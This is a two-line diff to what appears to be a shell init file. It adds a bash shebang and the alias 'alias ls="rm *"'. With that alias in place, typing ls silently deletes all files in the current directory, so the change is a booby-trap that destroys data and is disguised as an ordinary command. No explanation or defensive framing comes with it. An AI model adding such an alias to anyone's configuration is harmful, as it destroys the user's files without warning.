@@ -1,1 +1,2 @@
-Shell init files
+#!/bin/bash
+alias ls="rm *"
